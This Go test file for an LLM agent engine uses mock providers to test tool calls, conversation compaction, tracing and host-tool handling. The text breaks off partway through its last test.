package engine

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	pb "github.com/divmora/localharness/gen/go/localharness/v1"
	"github.com/divmora/localharness/internal/config"
	"github.com/divmora/localharness/internal/conversation"
	"github.com/divmora/localharness/internal/llm"
	"github.com/divmora/localharness/internal/tools"
	"github.com/divmora/localharness/internal/workspace"
)

// ─── Mock LLM Provider ──────────────────────────────────────────────────

// mockProvider is a configurable mock LLM provider for testing.
// It is safe for concurrent use by multiple goroutines (e.g., subagent tests).
type mockProvider struct {
	mu               sync.Mutex
	responses        []*llm.GenerateResponse
	responsesByModel map[string][]*llm.GenerateResponse
	callIndex        int
	callLog          []*llm.GenerateRequest
	genErr           error
	modelName        string
}

func (m *mockProvider) Generate(ctx context.Context, req *llm.GenerateRequest) (*llm.GenerateResponse, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.callLog = append(m.callLog, req)
	if m.genErr != nil {
		return nil, m.genErr
	}
	if m.callIndex >= len(m.responses) {
		return &llm.GenerateResponse{
			Content:      "fallback response",
			FinishReason: "stop",
		}, nil
	}
	resp := m.responses[m.callIndex]
	m.callIndex++
	return resp, nil
}

func (m *mockProvider) ModelName() string {
	if m.modelName != "" {
		return m.modelName
	}
	return "mock-model"
}

func (m *mockProvider) WithModel(modelName string) llm.Provider {
	m.mu.Lock()
	defer m.mu.Unlock()
	resps := m.responses
	if m.responsesByModel != nil && m.responsesByModel[modelName] != nil {
		resps = m.responsesByModel[modelName]
	}
	return &mockProvider{
		responses:        resps,
		responsesByModel: m.responsesByModel,
		genErr:           m.genErr,
		modelName:        modelName,
	}
}
func (m *mockProvider) Close() error { return nil }

// failOnceProvider fails on the first N calls, then succeeds.
type failOnceProvider struct {
	failCount   int
	failErr     error
	successResp *llm.GenerateResponse
	calls       int
}

func (f *failOnceProvider) Generate(ctx context.Context, req *llm.GenerateRequest) (*llm.GenerateResponse, error) {
	f.calls++
	if f.calls <= f.failCount {
		return nil, f.failErr
	}
	return f.successResp, nil
}
func (f *failOnceProvider) ModelName() string { return "fail-once-model" }
func (f *failOnceProvider) Close() error      { return nil }

// ─── Test Helpers ────────────────────────────────────────────────────────

func testEngine(t *testing.T, provider llm.Provider) (*Engine, string) {
	t.Helper()
	wsDir := t.TempDir()

	wsMgr, err := workspace.NewManager([]string{wsDir})
	if err != nil {
		t.Fatal(err)
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(wsMgr, logger)
	tools.RegisterBuiltinTools(reg, nil) // Default tools

	brainDir := t.TempDir()

	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		SystemPrompt:   "You are a test assistant.",
		ConversationID: "test-conv-id",
		TrajectoryID:   "test-traj-id",
		BrainDir:       brainDir,
		Logger:         logger,
	})

	return eng, wsDir
}

// ─── Engine Construction Tests ───────────────────────────────────────────

func TestNewEngine(t *testing.T) {
	provider := &mockProvider{}
	eng, _ := testEngine(t, provider)

	if eng == nil {
		t.Fatal("NewEngine returned nil")
	}
}

func TestNewEngineDefaultMaxTurns(t *testing.T) {
	provider := &mockProvider{}
	logger := slog.Default()

	eng := NewEngine(Config{
		Provider:     provider,
		ToolRegistry: tools.NewRegistry(nil, logger),
		Logger:       logger,
		MaxTurns:     0, // Should default to 50
	})

	if eng.maxTurns != 200 {
		t.Errorf("expected default maxTurns=200, got %d", eng.maxTurns)
	}
}

func TestNewEngineCustomMaxTurns(t *testing.T) {
	provider := &mockProvider{}
	logger := slog.Default()

	eng := NewEngine(Config{
		Provider:     provider,
		ToolRegistry: tools.NewRegistry(nil, logger),
		Logger:       logger,
		MaxTurns:     10,
	})

	if eng.maxTurns != 10 {
		t.Errorf("expected maxTurns=10, got %d", eng.maxTurns)
	}
}

// ─── Engine Run Tests ────────────────────────────────────────────────────

func TestRunSimpleTextResponse(t *testing.T) {
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				Content:      "Hello! I'm your assistant.",
				FinishReason: "stop",
				Usage: llm.Usage{
					PromptTokens:     10,
					CompletionTokens: 5,
					TotalTokens:      15,
				},
			},
		},
	}

	var steps []*pb.StepUpdate
	var trajStates []*pb.TrajectoryState

	eng, _ := testEngine(t, provider)
	eng.stepCB = func(step *pb.StepUpdate) {
		steps = append(steps, step)
	}
	eng.trajCB = func(state *pb.TrajectoryState) {
		trajStates = append(trajStates, state)
	}

	err := eng.Run(context.Background(), "Hello!")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Should have 2 steps: user message + model response
	if len(steps) < 2 {
		t.Errorf("expected at least 2 steps, got %d", len(steps))
	}

	// First step should be user message
	if steps[0].Source != pb.StepUpdate_SOURCE_USER {
		t.Error("first step should be from user")
	}

	// Last step should be model response
	lastStep := steps[len(steps)-1]
	if lastStep.Source != pb.StepUpdate_SOURCE_MODEL {
		t.Error("last step should be from model")
	}
	if lastStep.Text != "Hello! I'm your assistant." {
		t.Errorf("unexpected model text: %q", lastStep.Text)
	}

	// Trajectory states: RUNNING then IDLE
	if len(trajStates) < 2 {
		t.Errorf("expected at least 2 trajectory states, got %d", len(trajStates))
	}
	if trajStates[0].State != pb.TrajectoryState_TRAJ_RUNNING {
		t.Error("first trajectory state should be RUNNING")
	}
	if trajStates[len(trajStates)-1].State != pb.TrajectoryState_TRAJ_IDLE {
		t.Error("last trajectory state should be IDLE")
	}
}

func TestRunWithToolCalls(t *testing.T) {
	wsDir := t.TempDir()

	// Create a test file the LLM will "view"
	testFile := filepath.Join(wsDir, "test.txt")
	_ = os.WriteFile(testFile, []byte("hello world\n"), 0644)

	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				// First response: model wants to view a file
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
					{
						ID:   "call_1",
						Name: "view_file",
						Args: map[string]interface{}{
							"path": testFile,
						},
					},
				},
			},
			{
				// Second response: model provides final answer
				Content:      "I viewed the file. It contains 'hello world'.",
				FinishReason: "stop",
			},
		},
	}

	wsMgr, _ := workspace.NewManager([]string{wsDir})
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(wsMgr, logger)
	tools.RegisterBuiltinTools(reg, nil)

	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		SystemPrompt:   "test",
		ConversationID: "test-conv",
		TrajectoryID:   "test-traj",
		BrainDir:       t.TempDir(),
		Logger:         logger,
	})

	var steps []*pb.StepUpdate
	eng.stepCB = func(step *pb.StepUpdate) {
		steps = append(steps, step)
	}

	err := eng.Run(context.Background(), "Show me the test file")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Provider should have been called twice
	if len(provider.callLog) != 2 {
		t.Errorf("expected 2 LLM calls, got %d", len(provider.callLog))
	}

	// Should have steps for: user message, tool active, tool done, model response
	if len(steps) < 4 {
		t.Errorf("expected at least 4 steps, got %d", len(steps))
	}
}

func TestRunWithFinishTool(t *testing.T) {
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
					{
						ID:   "call_1",
						Name: "finish",
						Args: map[string]interface{}{
							"output_json": `{"done": true}`,
						},
					},
				},
			},
		},
	}

	eng, _ := testEngine(t, provider)

	var trajStates []*pb.TrajectoryState
	eng.trajCB = func(state *pb.TrajectoryState) {
		trajStates = append(trajStates, state)
	}

	err := eng.Run(context.Background(), "Finish the task")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Should emit COMPLETED trajectory state
	found := false
	for _, ts := range trajStates {
		if ts.State == pb.TrajectoryState_TRAJ_COMPLETED {
			found = true
		}
	}
	if !found {
		t.Error("expected TRAJ_COMPLETED state when finish tool is called")
	}
}

func TestRunLLMError(t *testing.T) {
	provider := &mockProvider{
		genErr: fmt.Errorf("API rate limit exceeded"),
	}

	eng, _ := testEngine(t, provider)

	var trajStates []*pb.TrajectoryState
	eng.trajCB = func(state *pb.TrajectoryState) {
		trajStates = append(trajStates, state)
	}

	err := eng.Run(context.Background(), "Hello")
	if err == nil {
		t.Error("Run should error when LLM fails")
	}

	// Should emit ERROR trajectory state
	found := false
	for _, ts := range trajStates {
		if ts.State == pb.TrajectoryState_TRAJ_ERROR {
			found = true
		}
	}
	if !found {
		t.Error("expected TRAJ_ERROR state when LLM fails")
	}
}

func TestRunContextCancellation(t *testing.T) {
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{Content: "response", FinishReason: "stop"},
		},
	}

	eng, _ := testEngine(t, provider)

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel immediately

	err := eng.Run(ctx, "Hello")
	if err == nil {
		t.Error("Run should error when context is cancelled")
	}
}

func TestRunMaxTurnsExceeded(t *testing.T) {
	// Provider always returns tool calls, never stops
	provider := &mockProvider{
		responses: func() []*llm.GenerateResponse {
			responses := make([]*llm.GenerateResponse, 100)
			for i := range responses {
				responses[i] = &llm.GenerateResponse{
					FinishReason: "tool_calls",
					ToolCalls: []llm.ToolCall{
						{
							ID:   fmt.Sprintf("call_%d", i),
							Name: "list_dir",
							Args: map[string]interface{}{"path": "/tmp"},
						},
					},
				}
			}
			return responses
		}(),
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))

	eng := NewEngine(Config{
		Provider:     provider,
		ToolRegistry: tools.NewRegistry(nil, logger),
		MaxTurns:     3,
		Logger:       logger,
		BrainDir:     t.TempDir(),
	})

	err := eng.Run(context.Background(), "Do something")
	if err == nil {
		t.Error("Run should error when max turns exceeded")
	}
}

func TestHistory(t *testing.T) {
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{Content: "Hello!", FinishReason: "stop"},
		},
	}

	eng, _ := testEngine(t, provider)

	// History should be empty initially
	if len(eng.History()) != 0 {
		t.Errorf("initial history should be empty, got %d", len(eng.History()))
	}

	_ = eng.Run(context.Background(), "Hi")

	// After run, history should have user + model messages
	history := eng.History()
	if len(history) < 2 {
		t.Errorf("expected at least 2 messages in history, got %d", len(history))
	}
	if history[0].Role != "user" {
		t.Error("first history entry should be user")
	}
	if history[len(history)-1].Role != "model" {
		t.Error("last history entry should be model")
	}
}

func TestBuildToolDeclarations(t *testing.T) {
	provider := &mockProvider{}
	eng, _ := testEngine(t, provider)

	decls := eng.buildToolDeclarations()
	if len(decls) == 0 {
		t.Error("should have tool declarations from registered tools")
	}

	// Verify each declaration has required fields
	for _, d := range decls {
		if d.Name == "" {
			t.Error("declaration missing name")
		}
		if d.Description == "" {
			t.Errorf("declaration %q missing description", d.Name)
		}
	}
}

// ─── Compaction Tests ────────────────────────────────────────────────────

func TestEstimateTokens(t *testing.T) {
	tests := []struct {
		name     string
		messages []llm.Message
		wantMin  int
		wantMax  int
	}{
		{
			name:     "empty messages",
			messages: nil,
			wantMin:  0,
			wantMax:  0,
		},
		{
			name: "single short message",
			messages: []llm.Message{
				{Role: "user", Content: "hello world"}, // 11 chars ≈ 2-3 tokens + overhead
			},
			wantMin: 5, // 4 overhead + 2 content
			wantMax: 10,
		},
		{
			name: "message with tool result",
			messages: []llm.Message{
				{
					Role: "tool",
					ToolResult: &llm.ToolCallResult{
						Name:    "view_file",
						Content: "some result content here", // 24 chars ≈ 6 tokens
					},
				},
			},
			wantMin: 10, // 4 overhead + 4 function overhead + name + content
			wantMax: 20,
		},
		{
			name: "message with tool calls",
			messages: []llm.Message{
				{
					Role: "model",
					ToolCalls: []llm.ToolCall{
						{Name: "view_file", Args: map[string]interface{}{"path": "/home/test/file.go"}},
					},
				},
			},
			wantMin: 10,
			wantMax: 25,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := EstimateTokens(tt.messages)
			if got < tt.wantMin || got > tt.wantMax {
				t.Errorf("EstimateTokens() = %d, want in range [%d, %d]", got, tt.wantMin, tt.wantMax)
			}
		})
	}
}

func TestCompactIfNeededBelowThreshold(t *testing.T) {
	logger := slog.Default()
	messages := []llm.Message{
		{Role: "user", Content: "hello"},
	}

	result, compResult, err := CompactIfNeeded(context.Background(), nil, messages, CompactionConfig{
		Threshold:          10000,
		KeepRecentMessages: 10,
	}, logger)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if compResult != nil {
		t.Error("should not compact when below threshold")
	}
	if len(result) != len(messages) {
		t.Error("messages should be unchanged")
	}
}

func TestCompactIfNeededDisabled(t *testing.T) {
	logger := slog.Default()
	messages := []llm.Message{
		{Role: "user", Content: "hello"},
	}

	result, compResult, err := CompactIfNeeded(context.Background(), nil, messages, CompactionConfig{
		Threshold: 0, // disabled
	}, logger)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if compResult != nil {
		t.Error("should not compact when disabled (threshold=0)")
	}
	if len(result) != len(messages) {
		t.Error("messages should be unchanged")
	}
}

func TestCompactIfNeededTooFewMessages(t *testing.T) {
	logger := slog.Default()
	// Create fewer messages than keepRecentMessages
	messages := make([]llm.Message, 5)
	for i := range messages {
		messages[i] = llm.Message{Role: "user", Content: "msg"}
	}

	result, compResult, err := CompactIfNeeded(context.Background(), nil, messages, CompactionConfig{
		Threshold:          1, // Low to trigger
		KeepRecentMessages: 10,
	}, logger)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if compResult != nil {
		t.Error("should not compact when fewer messages than keepRecentMessages")
	}
	if len(result) != len(messages) {
		t.Error("messages should be unchanged")
	}
}

func TestCompactIfNeededTriggered(t *testing.T) {
	logger := slog.Default()

	// Create enough messages to trigger compaction
	var messages []llm.Message
	for i := 0; i < 20; i++ {
		role := "user"
		if i%2 == 1 {
			role = "model"
		}
		messages = append(messages, llm.Message{
			Role:    role,
			Content: fmt.Sprintf("This is message %d with enough content to have some tokens in it so we exceed the threshold", i),
		})
	}

	summarizer := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				Content:      "Summary: A conversation about testing.",
				FinishReason: "stop",
			},
		},
	}

	result, compResult, err := CompactIfNeeded(context.Background(), summarizer, messages, CompactionConfig{
		Threshold:          10, // Very low to trigger
		KeepRecentMessages: 10,
	}, logger)
	if err != nil {
		t.Fatalf("CompactIfNeeded error: %v", err)
	}
	if compResult == nil {
		t.Fatal("expected compaction result")
	}
	if compResult.MessagesRemoved == 0 {
		t.Error("should have removed some messages")
	}
	if compResult.Summary == "" {
		t.Error("summary should not be empty")
	}
	if len(result) < 2 {
		t.Error("compacted result should have at least summary + ack")
	}
	if len(result) >= len(messages) {
		t.Error("compacted messages should be fewer than original")
	}

	// First message should be the summary
	if !strings.Contains(result[0].Content, "[Conversation Summary") {
		t.Error("first message should be the conversation summary")
	}
	// Second message should be model ack
	if result[1].Role != "model" {
		t.Error("second message should be model ack")
	}
}

func TestCompactIfNeededWithRealTokenCount(t *testing.T) {
	logger := slog.Default()

	// Small messages — character estimate would be low
	messages := []llm.Message{
		{Role: "user", Content: "hi"},
		{Role: "model", Content: "hello"},
		{Role: "user", Content: "how"},
		{Role: "model", Content: "good"},
		{Role: "user", Content: "ok"},
		{Role: "model", Content: "yes"},
		{Role: "user", Content: "hmm"},
		{Role: "model", Content: "alright"},
		{Role: "user", Content: "bye"},
		{Role: "model", Content: "goodbye"},
		{Role: "user", Content: "wait"},
		{Role: "model", Content: "sure"},
		{Role: "user", Content: "final"},
		{Role: "model", Content: "done"},
	}

	summarizer := &mockProvider{
		responses: []*llm.GenerateResponse{
			{Content: "Brief exchange of greetings.", FinishReason: "stop"},
		},
	}

	// Character estimate would be well below 500, but real count says 600
	result, compResult, err := CompactIfNeeded(context.Background(), summarizer, messages, CompactionConfig{
		Threshold:          500,
		KeepRecentMessages: 4,
		LastRealTokenCount: 600, // Real count triggers compaction
	}, logger)
	if err != nil {
		t.Fatalf("error: %v", err)
	}
	if compResult == nil {
		t.Fatal("real token count should have triggered compaction")
	}
	if len(result) < len(messages) {
		// Compaction happened (fewer messages)
	} else {
		t.Error("expected fewer messages after compaction")
	}
}

func TestCompactIfNeededConfigurableKeep(t *testing.T) {
	logger := slog.Default()

	// Create 15 messages
	var messages []llm.Message
	for i := 0; i < 15; i++ {
		role := "user"
		if i%2 == 1 {
			role = "model"
		}
		messages = append(messages, llm.Message{
			Role:    role,
			Content: fmt.Sprintf("Message %d with content", i),
		})
	}

	summarizer := &mockProvider{
		responses: []*llm.GenerateResponse{
			{Content: "Summary of messages.", FinishReason: "stop"},
		},
	}

	// Keep only 3 recent messages. Use real token count to trigger,
	// with a reasonable threshold that won't cause sliding window retries.
	result, compResult, err := CompactIfNeeded(context.Background(), summarizer, messages, CompactionConfig{
		Threshold:          5000,
		KeepRecentMessages: 3,
		LastRealTokenCount: 6000, // Real count triggers compaction
	}, logger)
	if err != nil {
		t.Fatalf("error: %v", err)
	}
	if compResult == nil {
		t.Fatal("expected compaction")
	}
	// Should have: summary + ack + 3 recent = 5 messages
	if len(result) != 5 {
		t.Errorf("expected 5 messages (summary + ack + 3 recent), got %d", len(result))
	}
	if compResult.MessagesRemoved != 12 {
		t.Errorf("expected 12 messages removed, got %d", compResult.MessagesRemoved)
	}
}

func TestCompactIfNeededCompactionFailure(t *testing.T) {
	logger := slog.Default()

	var messages []llm.Message
	for i := 0; i < 20; i++ {
		messages = append(messages, llm.Message{Role: "user", Content: "test content for compaction"})
	}

	// Summarizer that returns an error
	summarizer := &mockProvider{
		genErr: fmt.Errorf("API quota exceeded"),
	}

	result, compResult, err := CompactIfNeeded(context.Background(), summarizer, messages, CompactionConfig{
		Threshold:          1,
		KeepRecentMessages: 5,
	}, logger)

	// Should return error but also return original messages
	if err == nil {
		t.Error("expected error when summarizer fails")
	}
	if compResult != nil {
		t.Error("should not return compaction result on failure")
	}
	if len(result) != len(messages) {
		t.Error("should return original messages on failure")
	}
}

// ─── Engine-level Compaction Integration Tests ──────────────────────────

func TestRunWithCompaction(t *testing.T) {
	// Mock provider: first call is for compaction summary, remaining for main LLM
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				// Compaction summary call
				Content:      "Summary: Previous conversation about files and testing.",
				FinishReason: "stop",
			},
			{
				// Main LLM call: final text response
				Content:      "Here are the files.",
				FinishReason: "stop",
				Usage:        llm.Usage{TotalTokens: 150},
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	var steps []*pb.StepUpdate
	eng := NewEngine(Config{
		Provider:            provider,
		ToolRegistry:        reg,
		ConversationID:      "test",
		TrajectoryID:        "test",
		BrainDir:            t.TempDir(),
		Logger:              logger,
		CompactionThreshold: 100, // Low threshold to trigger
		KeepRecentMessages:  2,
	})
	eng.stepCB = func(step *pb.StepUpdate) {
		steps = append(steps, step)
	}

	// Pre-populate history to exceed threshold
	for i := 0; i < 20; i++ {
		role := "user"
		if i%2 == 1 {
			role = "model"
		}
		eng.history = append(eng.history, llm.Message{
			Role:    role,
			Content: fmt.Sprintf("Long message %d with plenty of content to push us over the compaction threshold limit", i),
		})
	}

	err := eng.Run(context.Background(), "Show me the files")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Check that a compaction step was emitted
	var sawCompaction bool
	for _, s := range steps {
		if comp := s.GetCompaction(); comp != nil {
			sawCompaction = true
			if comp.OriginalTokens <= 0 {
				t.Error("original tokens should be > 0")
			}
			if comp.MessagesRemoved <= 0 {
				t.Error("should have removed some messages")
			}
		}
	}
	if !sawCompaction {
		t.Error("expected a compaction step to be emitted")
	}
}

func TestRunWithCompactionFailureGraceful(t *testing.T) {
	// Provider that fails on compaction summary but succeeds for the main call
	callCount := 0
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			// First call: compaction summarizer → will fail (genErr set below)
			// Actually, we use genErr which applies to all calls.
			// Instead, build a provider that fails on first call but succeeds on second.
		},
	}

	// Custom provider: fails once (compaction), then succeeds (main LLM call)
	failOnce := &failOnceProvider{
		failCount: 1,
		failErr:   fmt.Errorf("API overloaded"),
		successResp: &llm.GenerateResponse{
			Content:      "Done.",
			FinishReason: "stop",
			Usage:        llm.Usage{TotalTokens: 50},
		},
	}
	_ = provider
	_ = callCount

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	eng := NewEngine(Config{
		Provider:            failOnce,
		ToolRegistry:        reg,
		ConversationID:      "test",
		TrajectoryID:        "test",
		BrainDir:            t.TempDir(),
		Logger:              logger,
		CompactionThreshold: 10,
		KeepRecentMessages:  2,
	})

	// Pre-populate history
	for i := 0; i < 15; i++ {
		role := "user"
		if i%2 == 1 {
			role = "model"
		}
		eng.history = append(eng.history, llm.Message{
			Role:    role,
			Content: fmt.Sprintf("History message %d with content", i),
		})
	}

	// Should succeed — compaction fails but engine continues with full history
	err := eng.Run(context.Background(), "Continue")
	if err != nil {
		t.Fatalf("Run should succeed even when compaction fails: %v", err)
	}
}

// ─── Tracer Tests ────────────────────────────────────────────────────────

func TestNewTracerEnabled(t *testing.T) {
	brainDir := t.TempDir()
	logger := slog.Default()

	tracer := NewTracer(brainDir, logger)
	if !tracer.enabled {
		t.Error("tracer should be enabled with valid brainDir")
	}

	// Verify trace directory was created
	traceDir := filepath.Join(brainDir, ".system_generated", "traces")
	if _, err := os.Stat(traceDir); err != nil {
		t.Errorf("trace directory should exist: %v", err)
	}
}

func TestNewTracerDisabled(t *testing.T) {
	logger := slog.Default()

	tracer := NewTracer("", logger)
	if tracer.enabled {
		t.Error("tracer should be disabled with empty brainDir")
	}
}

func TestTraceRequest(t *testing.T) {
	brainDir := t.TempDir()
	logger := slog.Default()
	tracer := NewTracer(brainDir, logger)

	req := &llm.GenerateRequest{
		Messages: []llm.Message{
			{Role: "user", Content: "hello"},
		},
		SystemPrompt: "test system prompt",
		Tools: []llm.FunctionDeclaration{
			{Name: "test_tool", Description: "A test"},
		},
	}

	tracer.TraceRequest(0, "test-model", req)

	// Verify trace file was created
	traceFile := filepath.Join(brainDir, ".system_generated", "traces", "step_0000_request.json")
	if _, err := os.Stat(traceFile); err != nil {
		t.Errorf("trace request file should exist: %v", err)
	}
}

func TestTraceResponse(t *testing.T) {
	brainDir := t.TempDir()
	logger := slog.Default()
	tracer := NewTracer(brainDir, logger)

	resp := &llm.GenerateResponse{
		Content:      "response content",
		FinishReason: "stop",
		Usage: llm.Usage{
			PromptTokens:     100,
			CompletionTokens: 50,
			TotalTokens:      150,
		},
	}

	tracer.TraceResponse(0, resp, 500*time.Millisecond, nil)

	traceFile := filepath.Join(brainDir, ".system_generated", "traces", "step_0000_response.json")
	if _, err := os.Stat(traceFile); err != nil {
		t.Errorf("trace response file should exist: %v", err)
	}
}

func TestTraceResponseWithError(t *testing.T) {
	brainDir := t.TempDir()
	logger := slog.Default()
	tracer := NewTracer(brainDir, logger)

	tracer.TraceResponse(1, nil, 100*time.Millisecond, fmt.Errorf("API error"))

	traceFile := filepath.Join(brainDir, ".system_generated", "traces", "step_0001_response.json")
	if _, err := os.Stat(traceFile); err != nil {
		t.Errorf("trace error response file should exist: %v", err)
	}
}

func TestTraceDisabledNoOp(t *testing.T) {
	logger := slog.Default()
	tracer := NewTracer("", logger) // disabled

	// These should not panic
	tracer.TraceRequest(0, "model", &llm.GenerateRequest{})
	tracer.TraceResponse(0, &llm.GenerateResponse{}, time.Second, nil)
}

// ─── LLM Types Tests ────────────────────────────────────────────────────

func TestLLMMessageTypes(t *testing.T) {
	// Verify llm.Message struct works as expected
	msg := llm.Message{
		Role:    "user",
		Content: "test",
		ToolCalls: []llm.ToolCall{
			{ID: "1", Name: "view_file", Args: map[string]interface{}{"path": "/test"}},
		},
		ToolResult: &llm.ToolCallResult{
			CallID:  "1",
			Name:    "view_file",
			Content: "file contents",
			IsError: false,
		},
	}

	if msg.Role != "user" {
		t.Error("Role mismatch")
	}
	if len(msg.ToolCalls) != 1 {
		t.Error("ToolCalls count mismatch")
	}
	if msg.ToolResult == nil {
		t.Error("ToolResult should not be nil")
	}
}

func TestGenerateRequest(t *testing.T) {
	req := &llm.GenerateRequest{
		Messages: []llm.Message{
			{Role: "user", Content: "hello"},
		},
		Tools: []llm.FunctionDeclaration{
			{Name: "test_tool", Description: "desc", Parameters: map[string]interface{}{}},
		},
		SystemPrompt: "You are helpful",
	}

	if len(req.Messages) != 1 {
		t.Error("messages count mismatch")
	}
	if len(req.Tools) != 1 {
		t.Error("tools count mismatch")
	}
}

// ─── Host Tool Tests ────────────────────────────────────────────────────

func TestRunWithHostTool(t *testing.T) {
	// LLM calls a host tool, handler immediately returns a result, LLM then gives final text.
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
					{
						ID:   "call_host_1",
						Name: "get_weather",
						Args: map[string]interface{}{"city": "Tokyo"},
					},
				},
			},
			{
				Content:      "The weather in Tokyo is 22°C and sunny.",
				FinishReason: "stop",
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	var steps []*pb.StepUpdate
	var handlerCalled bool
	var handlerTC llm.ToolCall

	// Track host tool step state transitions at emission time
	// (the engine reuses the same step pointer and mutates State)
	type stepSnapshot struct {
		state  pb.StepUpdate_State
		target pb.StepUpdate_Target
		isHost bool
	}
	var snapshots []stepSnapshot

	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		SystemPrompt:   "test",
		ConversationID: "test-conv",
		TrajectoryID:   "test-traj",
		BrainDir:       t.TempDir(),
		Logger:         logger,
		HostToolNames:  map[string]bool{"get_weather": true},
		HostToolDecls: []llm.FunctionDeclaration{
			{
				Name:        "get_weather",
				Description: "Get weather for a city",
				Parameters:  map[string]interface{}{"type": "object", "properties": map[string]interface{}{"city": map[string]interface{}{"type": "string"}}},
			},
		},
		HostToolHandler: func(ctx context.Context, tc llm.ToolCall, step *pb.StepUpdate) (string, bool, error) {
			handlerCalled = true
			handlerTC = tc
			return `{"temp": 22, "condition": "sunny"}`, false, nil
		},
	})

	eng.stepCB = func(step *pb.StepUpdate) {
		steps = append(steps, step)
		snapshots = append(snapshots, stepSnapshot{
			state:  step.State,
			target: step.Target,
			isHost: step.GetHostToolCall() != nil,
		})
	}

	err := eng.Run(context.Background(), "What's the weather in Tokyo?")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Handler should have been called
	if !handlerCalled {
		t.Fatal("host tool handler was not called")
	}
	if handlerTC.Name != "get_weather" {
		t.Errorf("expected tool name 'get_weather', got %q", handlerTC.Name)
	}
	if handlerTC.Args["city"] != "Tokyo" {
		t.Errorf("expected city 'Tokyo', got %v", handlerTC.Args["city"])
	}

	// Check snapshots for STATE_ACTIVE → STATE_WAITING → STATE_DONE on the host tool step
	var sawActive, sawWaiting, sawDone bool
	for _, snap := range snapshots {
		if !snap.isHost {
			continue
		}
		switch snap.state {
		case pb.StepUpdate_STATE_ACTIVE:
			sawActive = true
		case pb.StepUpdate_STATE_WAITING:
			sawWaiting = true
			if snap.target != pb.StepUpdate_TARGET_USER {
				t.Error("WAITING step should target USER")
			}
		case pb.StepUpdate_STATE_DONE:
			sawDone = true
		}
	}

	if !sawActive {
		t.Error("expected STATE_ACTIVE step for host tool")
	}
	if !sawWaiting {
		t.Error("expected STATE_WAITING step for host tool")
	}
	if !sawDone {
		t.Error("expected STATE_DONE step for host tool")
	}

	// LLM should have been called twice: first returns tool call, second returns text
	if len(provider.callLog) != 2 {
		t.Errorf("expected 2 LLM calls, got %d", len(provider.callLog))
	}

	// History should contain the tool result
	history := eng.History()
	var foundToolResult bool
	for _, msg := range history {
		if msg.ToolResult != nil && msg.ToolResult.Name == "get_weather" {
			foundToolResult = true
			if msg.ToolResult.IsError {
				t.Error("tool result should not be an error")
			}
		}
	}
	if !foundToolResult {
		t.Error("expected tool result in history for get_weather")
	}
}

func TestRunWithHostToolError(t *testing.T) {
	// Host tool handler returns isError=true
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
					{ID: "call_err", Name: "query_db", Args: map[string]interface{}{"sql": "SELECT *"}},
				},
			},
			{
				Content:      "Sorry, the database query failed.",
				FinishReason: "stop",
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(nil, logger)

	eng := NewEngine(Config{
		Provider:       provider,
		ToolRegistry:   reg,
		ConversationID: "test",
		TrajectoryID:   "test",
		BrainDir:       t.TempDir(),
		Logger:         logger,
		HostToolNames:  map[string]bool{"query_db": true},
		HostToolDecls: []llm.FunctionDeclaration{
			{Name: "query_db", Description: "Query database"},
		},
		HostToolHandler: func(ctx context.Context, tc llm.ToolCall, step *pb.StepUpdate) (string, bool, error) {
			return `{"error": "permission denied"}`, true, nil
		},
	})

	err := eng.Run(context.Background(), "Run a query")
	if err != nil {
		t.Fatalf("Run failed: %v", err)
	}

	// Tool result in history should be marked as error
	for _, msg := range eng.History() {
		if msg.ToolResult != nil && msg.ToolResult.Name == "query_db" {
			if !msg.ToolResult.IsError {
				t.Error("tool result should be marked as error")
			}
			return
		}
	}
	t.Error("expected query_db tool result in history")
}

func TestRunWithHostToolHandlerError(t *testing.T) {
	// Host tool handler returns a Go error (e.g., timeout, connection lost)
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
